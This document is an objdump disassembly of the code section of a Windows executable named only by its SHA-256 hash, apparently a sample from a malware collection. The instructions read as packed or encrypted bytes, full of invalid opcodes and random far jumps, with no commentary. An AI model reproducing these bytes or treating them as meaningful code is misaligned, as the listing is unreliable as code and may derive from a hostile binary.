
6cb704e3b0e980b408ffc9ffbe3b46d7ff5e3002cd7f03e35fb9817833cb048e.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	cmp    eax,0x9bf67ce5
  411005:	cmp    esi,DWORD PTR [eax+0xa2c2de0]
  41100b:	fsubp  st(2),st
  41100d:	mov    ebp,0x26c9229d
  411012:	jl     0x41102d
  411014:	mov    edx,0x675b7e1f
  411019:	fxch   st(2)
  41101b:	(bad)  [eax+eax*1-0xd]
  41101f:	into   
  411020:	push   esi
  411022:	into   
  411023:	shr    cl,cl
  411025:	push   edi
  411026:	push   edx
  411027:	sbb    DWORD PTR [edi],0x3c
  41102a:	lea    eax,[edx-0x58]
  41102d:	cwde   
  41102e:	(bad)  
  41102f:	or     DWORD PTR [ebx+0x301e20e4],ecx
  411035:	in     al,0x54
  411037:	push   ebx
  411038:	stos   DWORD PTR es:[edi],eax
  411039:	fisubr DWORD PTR [ecx]
  41103b:	dec    ebx
  41103c:	push   esp
  41103d:	jp     0x41108a
  41103f:	or     eax,0x48880327
  411044:	xchg   esp,eax
  411045:	pop    edx
  411046:	inc    esi
  411047:	add    DWORD PTR [ecx],ebx
  411049:	in     al,dx
  41104a:	repnz xchg ecx,eax
  41104c:	stc    
  41104d:	jg     0x411033
  41104f:	adc    al,0xa1
  411051:	pop    edx
  411052:	push   ebx
  411053:	mov    ds:0x38790262,eax
  411058:	shl    dl,0x10
  41105b:	into   
  41105c:	out    0xab,eax
  41105e:	shl    BYTE PTR [ebx-0x6f],0xb
  411062:	imul   ebx,DWORD PTR [ebx],0x1c
  411065:	dec    esi
  411066:	arpl   bp,di
  411068:	inc    edi
  411069:	out    dx,al
  41106a:	es leave 
  41106c:	xor    eax,0x8cd2f4cc
  411071:	mov    esi,0xde1a60ab
  411076:	mov    ebx,0xe3e88df5
  41107b:	fs test eax,0xc291f2c4
  411081:	out    dx,al
  411082:	adc    DWORD PTR [edx-0x67],ecx
  411085:	jecxz  0x4110e2
  411087:	in     eax,0x43
  411089:	mov    ah,0x64
  41108b:	push   edx
  41108c:	cdq    
  41108d:	sub    eax,0x589308bb
  411092:	xchg   edx,eax
  411093:	xor    al,0xbc
  411095:	mov    al,ds:0xd5aeecaa
  41109a:	sub    eax,0xf56f6b44
  41109f:	push   ecx
  4110a0:	clc    
  4110a1:	cmp    ebp,DWORD PTR [ebx+edi*2+0x3ca0b2fa]
  4110a8:	mov    DWORD PTR [ecx+0x22],eax
  4110ab:	inc    edx
  4110ac:	rol    BYTE PTR [edx+0x78],1
  4110af:	shl    BYTE PTR [esi],0x81
  4110b2:	call   0xe21a87e3
  4110b7:	(bad)
  4110ba:	inc    ecx
  4110bb:	hlt    
  4110bc:	leave  
  4110bd:	dec    esi
  4110be:	popf   
  4110bf:	dec    esi
  4110c0:	mov    ecx,0x2caf2488
  4110c5:	xchg   edx,eax
  4110c6:	cs pop ds
  4110c8:	push   ecx
  4110c9:	mov    ds:0x3788d915,eax
  4110ce:	sub    cl,BYTE PTR [edi+0x4]
  4110d1:	fist   WORD PTR [eax-0xc]
  4110d4:	fmul   QWORD PTR [ebx+0x41bda126]
  4110da:	pop    es
  4110db:	fidivr WORD PTR [edx+0x52]
  4110de:	pop    edi
  4110df:	in     al,dx
  4110e0:	cli    
  4110e1:	sbb    al,0xc2
  4110e3:	mov    DWORD PTR [edi],esi
  4110e5:	shl    BYTE PTR [eax-0x12e2af5d],1
  4110eb:	jle    0x411157
  4110ed:	call   0x9721:0xe9cc2abe
  4110f4:	mov    dh,0x1a
  4110f6:	sbb    al,0xcd
  4110f8:	xor    dl,bl
  4110fa:	in     al,dx
  4110fb:	call   0xe4d8e890
  411100:	adc    eax,0x304be50
  411105:	nop
  411106:	retf   0xf21d
  411109:	jge    0x4110bf
  41110b:	cs icebp 
  41110d:	mov    eax,0x39b3dbd8
  411112:	jge    0x41112e
  411114:	mov    esi,0xf53f5d11
  411119:	mov    ah,0xd7
  41111b:	lods   eax,DWORD PTR ds:[esi]
  41111c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41111d:	jl     0x41118b
  41111f:	loop   0x41110b
  411121:	dec    eax
  411122:	repz fidiv WORD PTR ds:0x2b6c7137
  411129:	bound  ecx,QWORD PTR cs:0x6043f796
  411130:	sahf   
  411131:	push   eax
  411132:	pmaxsw mm1,QWORD PTR [ebx]
  411135:	jmp    0x9898:0x64bcd404
  41113c:	dec    edx
  41113d:	pop    es
  41113e:	xchg   esi,eax
  41113f:	ss hlt 
  411141:	mov    ebp,0x6c7b6c9
  411146:	stc    
  411147:	inc    esp
  411148:	rcr    BYTE PTR [edx+0x39],0xf9
  41114c:	xchg   esp,eax
  41114d:	rcl    ah,0x7e
  411150:	cwde   
  411151:	sbb    bl,ah
  411153:	pop    edi
  411154:	shl    DWORD PTR [ebx+0x2],cl
  411157:	pop    ds
  411158:	sub    al,0x78
  41115a:	sbb    BYTE PTR [edx],ch
  41115c:	ret    
  41115d:	sub    BYTE PTR [esi],ah
  41115f:	pop    eax
  411160:	xchg   edx,eax
  411161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411162:	cs (bad) 
  411164:	or     edi,ebx
  411166:	jl     0x411142
  411168:	lods   eax,DWORD PTR ds:[esi]
  411169:	cli    
  41116a:	jne    0x411149
  41116c:	enter  0xe99b,0x68
  411170:	add    eax,0x4ec3bedc
  411175:	and    esi,DWORD PTR [esi+edx*8-0x20]
  411179:	popa   
  41117a:	xor    bh,BYTE PTR [edx-0x21]
  41117d:	mov    WORD PTR [esi],ss
  41117f:	xor    DWORD PTR [edx-0x27],esi
  411182:	push   0x40
  411184:	adc    al,0x6f
  411186:	aas    
  411187:	xchg   esi,eax
  411188:	or     al,dl
  41118a:	dec    ecx
  41118b:	fnsave [esi-0x183d6da9]
  411191:	cwde   
  411192:	imul   ebx,DWORD PTR [edi],0xffffff82
  411195:	mov    al,ds:0xbf5b5369
  41119a:	(bad)  
  41119b:	ins    BYTE PTR es:[edi],dx
  41119c:	sahf   
  41119d:	and    al,0x6a
  41119f:	sbb    edx,DWORD PTR [ebx+0x25]
  4111a2:	dec    ecx
  4111a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a4:	shl    esi,cl
  4111a6:	mov    ebp,0xc6ec9205
  4111ab:	sar    DWORD PTR [edx+ebx*1],1
  4111ae:	jne    0x411206
  4111b0:	gs loop 0x4111c2
  4111b3:	fimul  DWORD PTR [ebp+0x33]
  4111b6:	inc    ebp
  4111b7:	mov    esi,0x9df8d3d
  4111bc:	jle    0x4111d8
  4111be:	mov    ds:0xe2abee5,eax
  4111c3:	rcr    BYTE PTR [ebp+0x7f],1
  4111c6:	test   eax,0x7d311d61
  4111cb:	(bad)  
  4111cd:	cmp    DWORD PTR [edx-0x1135afe6],edi
  4111d3:	out    0x3a,al
  4111d5:	fnstcw WORD PTR [edi+0x5e]
  4111d8:	adc    ecx,0x5d
  4111db:	sbb    eax,0xc7f6bea1
  4111e0:	sub    eax,0x12f4d3cd
  4111e5:	outs   dx,DWORD PTR ds:[esi]
  4111e6:	xchg   edi,eax
  4111e7:	adc    al,0x55
  4111e9:	test   DWORD PTR [edi+0x38],ebx
  4111ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111ed:	or     eax,0xf1b30ff5
  4111f2:	pop    eax
  4111f3:	pop    edi
  4111f4:	outs   dx,BYTE PTR ds:[esi]
  4111f5:	sub    al,0xde
  4111f7:	div    cl
  4111f9:	dec    edx
  4111fa:	xchg   esp,eax
  4111fb:	mov    ch,cl
  4111fd:	mov    ds:0xd5bb53eb,eax
  411202:	daa    
  411203:	or     dl,BYTE PTR [edi]
  411205:	inc    esi
  411206:	out    0x2c,eax
  411208:	in     eax,0x8a
  41120a:	jbe    0x4111ba
  41120c:	mov    ebx,0x81bd8c2d
  411211:	int    0x2d
  411213:	mov    ecx,ebx
  411215:	sub    DWORD PTR [esi],esi
  411217:	ror    DWORD PTR [edi],1
  411219:	push   ss
  41121a:	cmp    al,0x9c
  41121c:	dec    edx
  41121d:	jmp    0xfb07b835
  411222:	cs dec edx
  411224:	mov    esi,esi
  411226:	retf   
  411227:	jp     0x411255
  411229:	inc    esi
  41122a:	scas   al,BYTE PTR es:[edi]
  41122b:	mov    al,0xb0
  41122d:	add    eax,0x150b95f1
  411232:	nop
  411233:	sub    BYTE PTR [edi+0x34],0x1
  411237:	nop
  411238:	add    al,0xca
  41123a:	mov    dl,0x6a
  41123c:	push   esi
  41123d:	push   eax
  41123e:	adc    DWORD PTR [edx-0x2789ab0e],ecx
  411244:	jmp    0x3711d1aa
  411249:	loop   0x411298
  41124b:	mov    dl,0x3f
  41124d:	mov    bl,dh
  41124f:	inc    esp
  411250:	dec    ebx
  411251:	bound  esi,QWORD PTR [esi]
  411253:	push   cs
  411254:	xor    dl,dl
  411256:	jmp    0xd344:0xea9e587d
  41125d:	loop   0x4112c7
  41125f:	xchg   edx,eax
  411260:	mov    esp,0xc2724840
  411265:	jbe    0x411276
  411267:	ret    
  411268:	scas   al,BYTE PTR es:[edi]
  411269:	pop    edx
  41126a:	adc    al,0x2d
  41126c:	push   ebx
  41126d:	jno    0x4112ba
  41126f:	stos   BYTE PTR es:[edi],al
  411270:	inc    eax
  411271:	dec    edi
  411272:	mov    edx,0x1b5ac6a3
  411277:	jp     0x4112c2
  411279:	push   ebx
  41127a:	and    al,0x4b
  41127d:	xchg   al,ch
  41127f:	inc    edi
  411280:	sub    DWORD PTR [esi-0x7d0a45e9],edi
  411286:	jnp    0x411281
  411288:	jge    0x41126b
  41128a:	push   esi
  41128b:	lds    edi,FWORD PTR [edi+0x18b482b2]
  411291:	inc    eax
  411292:	icebp  
  411293:	scas   eax,DWORD PTR es:[edi]
  411294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411295:	fbstp  TBYTE PTR [esi+0x7]
  411298:	pop    edi
  411299:	sub    bh,bl
  41129b:	in     eax,dx
  41129c:	mov    dl,0xad
  41129e:	mov    esi,0xfc6dc56
  4112a3:	jmp    0x4112a4
  4112a5:	mov    bl,0xc2
  4112a7:	sar    BYTE PTR [ebp+ecx*8+0x19],1
  4112ab:	mov    eax,ds:0x90b2e4f3
  4112b0:	stos   DWORD PTR es:[edi],eax
  4112b1:	pop    ds
  4112b2:	(bad)  
  4112b3:	sbb    DWORD PTR [eax],ebp
  4112b5:	cmp    edx,DWORD PTR [esp+eiz*8]
  4112b8:	xlat   BYTE PTR ds:[ebx]
  4112b9:	cld    
  4112ba:	or     al,0x3d
  4112bc:	sub    DWORD PTR [eax+0x3c],eax
  4112bf:	dec    eax
  4112c0:	push   esi
  4112c1:	mov    ch,0x1a
  4112c3:	enter  0xd166,0x30
  4112c7:	inc    esp
  4112c8:	fwait
  4112c9:	mov    bh,0x3
  4112cb:	or     edx,DWORD PTR [edi+0x40e979e5]
  4112d1:	fwait
  4112d2:	adc    dl,cl
  4112d4:	jns    0x41129f
  4112d6:	dec    ebx
  4112d7:	adc    ebp,esi
  4112d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112da:	push   0x9744d225
  4112df:	push   esi
  4112e0:	sbb    DWORD PTR [ebx+0x3985015a],ecx
  4112e6:	idiv   DWORD PTR [ebp+0x1b]
  4112e9:	stos   DWORD PTR es:[edi],eax
  4112ea:	ret    0xb26d
  4112ed:	pop    ebx
  4112ee:	cmp    DWORD PTR [ebx+0x4c2b79e8],0xd4f56639
  4112f8:	rcl    DWORD PTR [ecx-0x55ff7e1a],0x73
  4112ff:	push   ebx
  411300:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  411302:	or     esp,DWORD PTR [ebx+0x6835b471]
  411308:	sbb    eax,0x26ea00cc
  41130d:	cld    
  41130e:	jb     0x411294
  411310:	not    DWORD PTR [ecx+0x6a672070]
  411316:	fwait
  411317:	dec    edx
  411318:	(bad)  
  411319:	jb     0x4112b1
  41131b:	fbstp  TBYTE PTR [eax-0x7e26ec72]
  411321:	repnz add BYTE PTR [esi],ah
  411324:	(bad)  
  411325:	fnstcw WORD PTR [edi]
  411327:	push   ebp
  411328:	adc    BYTE PTR [ebx],ah
  41132a:	sub    DWORD PTR [eax+0x34057aae],0x5e
  411331:	loop   0x41135a
  411333:	sahf   
  411334:	bound  esi,QWORD PTR [edi-0x6e6b87b4]
  41133a:	push   cs
  41133b:	cmp    eax,0x10ae4ea
  411340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411341:	(bad)  
  411342:	mov    edx,0x14011380
  411347:	ja     0x4112fc
  411349:	pop    ss
  41134a:	cmp    al,0x34
  41134c:	jmp    0xb104:0x56e33dd3
  411353:	jo     0x4113ca
  411355:	inc    edi
  411356:	lahf   
  411357:	inc    edx
  411358:	push   es
  411359:	clc    
  41135a:	jmp    0x411303
  41135c:	stc    
  41135d:	aaa    
  41135e:	repnz ffree st(4)
  411361:	loopne 0x411345
  411363:	mov    edx,0xd6bdf9ee
  411368:	scas   eax,DWORD PTR es:[edi]
  411369:	mov    dl,0xcd
  41136b:	outs   dx,BYTE PTR ds:[esi]
  41136c:	push   cs
  41136d:	jp     0x4112fc
  41136f:	scas   al,BYTE PTR es:[edi]
  411370:	adc    edx,0xe30e9841
  411376:	js     0x41130a
  411378:	test   ch,bh
  41137a:	lock lods eax,DWORD PTR ds:[esi]
  41137c:	inc    esp
  41137d:	jp     0x41137b
  41137f:	mov    DWORD PTR [eax+0xe],0x887fe222
  411386:	adc    bh,ah
  411388:	sbb    eax,0x73c5cdec
  41138d:	jg     0x411346
  41138f:	mov    bh,0x54
  411391:	lods   al,BYTE PTR ds:[esi]
  411392:	jp     0x4113b2
  411394:	pusha  
  411395:	xor    eax,0x6f0e0b16
  41139a:	inc    esp
  41139b:	push   0xa5f65830
  4113a0:	cmc    
  4113a1:	fld    TBYTE PTR [edx]
  4113a3:	mov    dh,0xc5
  4113a5:	mov    edx,0x3a7bb273
  4113aa:	mov    ds:0x39cbbd75,eax
  4113af:	loop   0x41141a
  4113b1:	xor    edx,ecx
  4113b3:	inc    edi
  4113b4:	bound  esi,QWORD PTR [edi+0x2dd4eb2f]
  4113ba:	mov    al,ds:0xd3c0b941
  4113bf:	(bad)  
  4113c0:	(bad)  
  4113c1:	cld    
  4113c2:	mov    dh,0xdb
  4113c4:	dec    ecx
  4113c5:	jb     0x4113d1
  4113c7:	mov    eax,ds:0x6d1d30f7
  4113cc:	aad    0xb4
  4113ce:	sbb    al,0x99
  4113d0:	retf   
  4113d1:	ja     0x4113c3
  4113d3:	lahf   
  4113d4:	(bad)
  4113d7:	mov    bh,0xbf
  4113d9:	xor    eax,0xa35de339
  4113de:	dec    esi
  4113df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e0:	sahf   
  4113e1:	sbb    esi,DWORD PTR [esi]
  4113e3:	xchg   ecx,eax
  4113e4:	sbb    ebx,DWORD PTR [ecx]
  4113e6:	into   
  4113e7:	or     al,BYTE PTR [ebx]
  4113e9:	jne    0x4113ba
  4113eb:	mov    ebp,0x612239b8
  4113f0:	mov    al,BYTE PTR [ecx]
  4113f2:	aas    
  4113f3:	adc    BYTE PTR [edi],ah
  4113f5:	fisub  WORD PTR [edx+ecx*1+0x383b33cf]
  4113fc:	(bad)  
  4113fd:	in     eax,dx
  4113fe:	cmp    edx,DWORD PTR [esi]
  411400:	mov    WORD PTR [ecx+0x1c],fs
  411403:	lods   eax,DWORD PTR ds:[esi]
  411404:	adc    eax,0x7039f3d0
  411409:	adc    cl,BYTE PTR [edx]
  41140b:	ret    0xd0c2
  41140e:	cwde   
  41140f:	xchg   ecx,eax
  411410:	adc    al,ah
  411412:	xchg   ecx,eax
  411413:	aaa    
  411414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411415:	lock fdiv QWORD PTR [esi+0x1e]
  411419:	ret    
  41141a:	loope  0x4113c5
  41141c:	stos   DWORD PTR es:[edi],eax
  41141d:	push   ebp
  41141e:	int    0xeb
  411420:	pushf  
  411421:	out    dx,al
  411422:	push   eax
  411423:	push   eax
  411424:	mov    bl,0x30
  411426:	std    
  411427:	xor    BYTE PTR [ebp+eax*2+0x3c3052d],0x2f
  41142f:	sbb    al,0x4a
  411431:	adc    eax,0x60fc6f2e
  411436:	adc    BYTE PTR [esp+esi*1],dl
  411439:	enter  0x77f6,0x5d
  41143d:	jno    0x411462
  41143f:	retf   
  411440:	pop    ebx
  411441:	inc    esp
  411442:	mov    eax,ds:0x96cf7750
  411447:	cmp    ah,BYTE PTR [edi+0x45]
  41144a:	sub    BYTE PTR [ebx],ah
  41144c:	ret    0x732c
  41144f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411450:	pop    esp
  411451:	mov    al,0x11
  411453:	mov    eax,0xf0e495ef
  411458:	(bad)  
  41145a:	sub    eax,DWORD PTR cs:[eax-0x6e]
  41145e:	pushf  
  41145f:	int    0x5c
  411461:	inc    edx
  411462:	sub    dl,BYTE PTR [esi+ecx*2-0x3a]
  411466:	or     al,dh
  411468:	arpl   ax,sp
  41146a:	jns    0x411423
  41146c:	arpl   bp,cx
  41146e:	sub    BYTE PTR [esi+0x48828fdf],bl
  411474:	xchg   esp,eax
  411475:	in     eax,0xc6
  411477:	cs clc 
  411479:	popf   
  41147a:	loopne 0x4114e7
  41147c:	into   
  41147d:	jge    0x4114ec
  41147f:	or     cl,bl
  411481:	fidiv  WORD PTR [edi+0x3fbfeece]
  411487:	div    DWORD PTR [edx]
  411489:	pop    esp
  41148a:	cmp    BYTE PTR [edx+0x5517e33a],dl
  411490:	test   al,0x24
  411492:	ins    DWORD PTR es:[edi],dx
  411493:	push   esi
  411494:	ins    BYTE PTR es:[di],dx
  411496:	cmp    al,BYTE PTR [ebx]
  411498:	aam    0x28
  41149a:	adc    eax,DWORD PTR [ebx]
  41149c:	je     0x41146d
  41149e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149f:	inc    edi
  4114a0:	add    DWORD PTR [edi+0x2099774f],esi
  4114a6:	fcmovbe st,st(4)
  4114a8:	mov    bh,0x55
  4114aa:	cs mov esp,0xea580cef
  4114b0:	sbb    eax,0xc9e1a877
  4114b5:	cs pop ss
  4114b7:	sub    dl,dl
  4114b9:	mov    dh,0x1d
  4114bb:	jbe    0x41145c
  4114bd:	aaa    
  4114be:	push   cs
  4114bf:	add    bh,BYTE PTR [ecx-0x2364a6c1]
  4114c5:	xchg   esi,eax
  4114c6:	xor    BYTE PTR [eax],bl
  4114c8:	push   ebp
  4114c9:	push   0x35
  4114cb:	fstp   st(4)
  4114cd:	sub    ch,BYTE PTR [ebx+edi*4+0x6928cbe4]
  4114d4:	sbb    BYTE PTR [ecx-0x2f],bh
  4114d7:	or     al,0x8e
  4114d9:	lahf   
  4114da:	mov    ds:0xb0c7f666,eax
  4114df:	cmp    eax,0xf598dd34
  4114e4:	and    BYTE PTR [edx],dl
  4114e6:	add    BYTE PTR [ebp+0x73],0x77
  4114ea:	and    DWORD PTR [eax],ecx
  4114ec:	repz int 0x95
  4114ef:	mov    dh,0x4b
  4114f1:	loopne 0x411508
  4114f3:	inc    eax
  4114f4:	out    0xaf,eax
  4114f6:	aaa    
  4114f7:	jg     0x411484
  4114f9:	pop    bx
  4114fb:	or     al,0xc7
  4114fd:	xor    cl,BYTE PTR [edi]
  4114ff:	and    DWORD PTR [ecx+0x1ef0cfc8],eax
  411505:	jae    0x4114db
  411507:	ss aaa 
  411509:	dec    eax
  41150a:	mov    esi,0x78954557
  41150f:	add    edx,DWORD PTR [eax+edi*1-0xfe35f55]
  411516:	fild   DWORD PTR [edi-0x4e]
  411519:	dec    esp
  41151a:	es repnz mov ecx,0x8433493d
  411521:	cdq    
  411522:	xor    eax,0x42cac30d
  411527:	add    BYTE PTR [ebp+0x7a],al
  41152a:	cmc    
  41152b:	mov    dh,0x96
  41152d:	sub    DWORD PTR [edi-0x3f558de],eax
  411533:	out    dx,al
  411534:	sub    ebp,ecx
  411536:	daa    
  411537:	sahf   
  411538:	sub    DWORD PTR [ebp+0x692b8b74],eax
  41153e:	xchg   esp,ebp
  411540:	mov    ch,0xa6
  411542:	push   ss
  411543:	push   edi
  411544:	push   eax
  411545:	mov    al,0xa9
  411547:	inc    edx
  411548:	jge    0x411599
  41154a:	stos   DWORD PTR es:[edi],eax
  41154b:	cmp    DWORD PTR [ecx+0x3868b921],edi
  411551:	scas   al,BYTE PTR es:[edi]
  411552:	(bad)  
  411553:	dec    esp
  411554:	cmp    bl,BYTE PTR [eax+0x9]
  411557:	mov    esp,0xc9bfc383
  41155c:	sbb    ch,BYTE PTR [ecx+esi*8-0x68757d9c]
  411563:	mov    edx,0x6c6bb7c7
  411568:	or     DWORD PTR [ebp-0x211633a3],0x6a198f8c
  411572:	scas   eax,DWORD PTR es:[edi]
  411573:	shr    BYTE PTR [eax-0xf736fb7],0x19
  41157a:	enter  0xcc0c,0xba
  41157e:	sti    
  41157f:	sub    DWORD PTR [eax+ebx*8-0x48a1ed90],esi
  411586:	or     DWORD PTR [edi+ebp*1-0x49d6b942],edx
  41158d:	fnsave [ebp-0x71]
  411590:	call   0x2e13:0xdde3572
  411597:	mov    al,ds:0xe5dc0207
  41159c:	sbb    dl,BYTE PTR [eax+0x5c]
  41159f:	sub    DWORD PTR [edx-0x1],esi
  4115a2:	push   edx
  4115a3:	inc    edi
  4115a4:	sbb    bh,BYTE PTR [ebp+0x3926c251]
  4115aa:	mov    cl,0x2a
  4115ac:	inc    eax
  4115ad:	fstp   st(4)
  4115af:	bound  edx,QWORD PTR [eax-0x512d9cf6]
  4115b5:	test   eax,0x7767c0db
  4115ba:	xchg   DWORD PTR [eax+0x76],eax
  4115bd:	fsub   QWORD PTR [edi+0x6ec7447]
  4115c3:	or     eax,0x3c4062b7
  4115c8:	lock jg 0x4115f3
  4115cb:	push   es
  4115cc:	imul   ebx,DWORD PTR [esi+edi*1-0x65300973],0x4f
  4115d4:	add    esi,DWORD PTR [esi]
  4115d6:	xchg   edx,eax
  4115d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d8:	cmp    edi,ecx
  4115da:	test   BYTE PTR [ecx-0x13358e6e],0x47
  4115e1:	repnz cli 
  4115e3:	pop    ebx
  4115e4:	mov    ebp,0x4f127910
  4115e9:	adc    BYTE PTR [esi+0x1],0x16
  4115ed:	inc    esi
  4115ee:	push   es
  4115ef:	test   BYTE PTR [ecx-0x627dfdfe],al
  4115f5:	enter  0xb3dc,0xab
  4115f9:	jo     0x41157c
  4115fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115fc:	or     DWORD PTR [edi+0x6e],ebp
  4115ff:	inc    edi
  411600:	outs   dx,BYTE PTR ds:[esi]
  411601:	rcr    esi,1
  411603:	std    
  411604:	ror    BYTE PTR [esi*1-0x5f7f5d57],cl
  41160b:	and    BYTE PTR [edi],bh
  41160d:	ins    BYTE PTR es:[edi],dx
  41160e:	xor    al,0x75
  411610:	cmp    BYTE PTR [ecx],dl
  411612:	dec    edx
  411613:	call   DWORD PTR [esi]
  411615:	push   ecx
  411616:	call   0xa0de48db
  41161b:	xor    DWORD PTR [ecx-0x7d],ecx
  41161e:	sub    BYTE PTR [ecx],dh
  411620:	pop    ss
  411621:	push   eax
  411622:	push   edi
  411623:	test   BYTE PTR [edx],bh
  411625:	inc    ecx
  411626:	dec    esi
  411627:	ss and eax,0x9ed58922
  41162d:	pop    ebx
  41162e:	cmp    bl,0x3a
  411631:	push   ecx
  411632:	or     DWORD PTR [ecx],ecx
  411634:	retf   
  411635:	push   esi
  411636:	retf   0xc84c
  411639:	mov    edx,0x75f511de
  41163e:	xor    BYTE PTR [eax+0x2d],bh
  411641:	jge    0x4115dc
  411643:	retf   0x5c0c
  411646:	leave  
  411647:	fidiv  WORD PTR [eax+0x34ccb26b]
  41164d:	xor    eax,DWORD PTR [edx]
  41164f:	xor    DWORD PTR [eax-0x321b3ff4],esp
  411655:	push   ebx
  411656:	or     esp,DWORD PTR [edi+0x3e]
  411659:	aaa    
  41165a:	or     eax,0x5c6eb7aa
  41165f:	jle    0x411697
  411661:	pop    edi
  411662:	jmp    0x4115f2
  411664:	push   0xffffff8b
  411666:	and    ecx,esp
  411668:	mov    BYTE PTR [edi],bl
  41166a:	mov    dl,0x59
  41166c:	sti    
  41166d:	pop    es
  41166e:	pop    edi
  41166f:	sub    BYTE PTR [edi-0x53],bh
  411672:	and    al,0xeb
  411674:	cmp    ch,BYTE PTR ds:0xac42c26a
  41167a:	lahf   
  41167b:	cld    
  41167c:	add    ecx,DWORD PTR [esi+0x0]
  41167f:	std    
  411680:	call   0xfa3b:0x69af6578
  411687:	in     al,0x5a
  411689:	jecxz  0x411635
  41168b:	pop    edx
  41168c:	xor    al,0xc4
  41168e:	loope  0x411687
  411690:	stc    
  411691:	fucomp st(4)
  411693:	dec    esi
  411694:	(bad)  
  411695:	out    dx,al
  411696:	popf   
  411697:	mov    DWORD PTR [eax+0x5f],esp
  41169a:	sbb    BYTE PTR [edi],0x4c
  41169d:	dec    ecx
  41169e:	mov    edi,DWORD PTR [ebp+0x47f99e9e]
  4116a4:	push   0x6599f963
  4116a9:	jecxz  0x4116e9
  4116ab:	fist   WORD PTR [eax+0x7b]
  4116ae:	pop    ebx
  4116af:	jnp    0x41172e
  4116b1:	jo     0x4116c4
  4116b3:	rol    BYTE PTR [eax+edx*2],1
  4116b6:	and    eax,0x37cf14f
  4116bb:	test   al,0x17
  4116bd:	imul   esp,esp,0x11
  4116c0:	push   eax
  4116c1:	ror    BYTE PTR [ebx],1
  4116c3:	(bad)  
  4116c4:	or     dh,BYTE PTR [eax]
  4116c6:	mov    edi,cs
  4116c8:	dec    ebp
  4116c9:	stos   BYTE PTR es:[edi],al
  4116ca:	sub    BYTE PTR gs:[edx+0x42],bl
  4116ce:	data16 js 0x41172d
  4116d1:	retf   
  4116d2:	inc    ebx
  4116d4:	in     al,dx
  4116d5:	cli    
  4116d6:	inc    ebx
  4116d7:	inc    esp
  4116d8:	cmp    ebp,DWORD PTR [edi]
  4116da:	jecxz  0x4116f0
  4116dc:	dec    ecx
  4116dd:	cmp    DWORD PTR [edx-0x33e3459d],ebx
  4116e3:	and    BYTE PTR [ebp-0x3b0ccf71],0xf
  4116ea:	sub    DWORD PTR [edi-0x80],edi
  4116ed:	loop   0x4116cc
  4116ef:	push   ds
  4116f0:	inc    esi
  4116f1:	mov    ah,0xaf
  4116f3:	inc    esi
  4116f4:	or     DWORD PTR [eax+0x1d0e212d],0xd54419af
  4116fe:	stos   DWORD PTR es:[edi],eax
  4116ff:	or     eax,0xb90cf753
  411704:	popf   
  411705:	(bad)  
  411706:	cli    
  411707:	std    
  411708:	cs leave 
  41170a:	jae    0x4116d8
  41170c:	mov    eax,ds:0x82b7962d
  411711:	jmp    0xada60320
  411716:	add    BYTE PTR [eax+0x3e794b2],ch
  41171c:	inc    ebp
  41171d:	push   0x1fc8e5d9
  411722:	jne    0x411760
  411724:	fstp   DWORD PTR [ebx]
  411726:	fstp   QWORD PTR [esi+ebp*2+0x13662b78]
  41172d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41172e:	cli    
  41172f:	arpl   WORD PTR [ecx],dx
  411731:	adc    DWORD PTR [eax+0x53],eax
  411734:	or     edx,DWORD PTR [edi+0x4f]
  411737:	cmp    al,0x32
  411739:	inc    ecx
  41173a:	add    dl,BYTE PTR [edx+0xf8c8997]
  411740:	cwde   
  411741:	push   ss
  411742:	dec    ebx
  411743:	sbb    al,0x8e
  411745:	repz cmp DWORD PTR [eax+edi*2+0x76],edx
  41174a:	shl    al,1
  41174c:	in     al,dx
  41174d:	cmp    bh,BYTE PTR [edi+0x4f31cbbb]
  411753:	sbb    edi,DWORD PTR ds:0xc553a9c4
  411759:	bound  edi,QWORD PTR [edx-0x3d]
  41175c:	cld    
  41175d:	and    eax,0x32207b77
  411762:	cli    
  411763:	and    al,0xb6
  411765:	xor    BYTE PTR [edx-0x5896cd53],dh
  41176b:	jecxz  0x4117bf
  41176d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41176e:	mov    ebp,DWORD PTR [ebp-0x7f696985]
  411774:	add    DWORD PTR [eax+0xd],0xffffffdd
  411778:	inc    ecx
  411779:	mov    ecx,0xe8150870
  41177e:	ins    DWORD PTR es:[edi],dx
  41177f:	fdiv   DWORD PTR [ebx+0x9]
  411782:	xchg   ebp,eax
  411783:	lea    esi,[edi+eiz*2-0x3b]
  411787:	adc    ebp,DWORD PTR [esi-0x1a]
  41178a:	inc    ebp
  41178b:	les    esp,FWORD PTR [eax-0x33]
  41178e:	push   0xffffff87
  411790:	call   0xb85a:0x84674a1c
  411797:	mov    esi,DWORD PTR [esi+0x2e3f7759]
  41179d:	push   esi
  41179e:	lock mov eax,0xf4425d3b
  4117a4:	push   esi
  4117a5:	xchg   ecx,eax
  4117a6:	push   ecx
  4117a7:	cs pop ds
  4117a9:	inc    edx
  4117aa:	ja     0x41178f
  4117ac:	cmp    DWORD PTR [esi-0x4f],ebx
  4117af:	mov    ecx,0xb4ac93f5
  4117b4:	and    eax,DWORD PTR [eax+0x1c]
  4117b7:	repz test BYTE PTR [ebx+0x3c],dl
  4117bb:	setne  dh
  4117be:	pop    esp
  4117bf:	sub    BYTE PTR [eax-0x647f27de],al
  4117c5:	mov    al,0xa4
  4117c7:	pusha  
  4117c8:	xor    eax,0x6cb55667
  4117cd:	das    
  4117ce:	sub    eax,0x829e168f
  4117d3:	repnz pop ebx
  4117d5:	retf   0x563f
  4117d8:	mov    ebx,0xcfaf8d1c
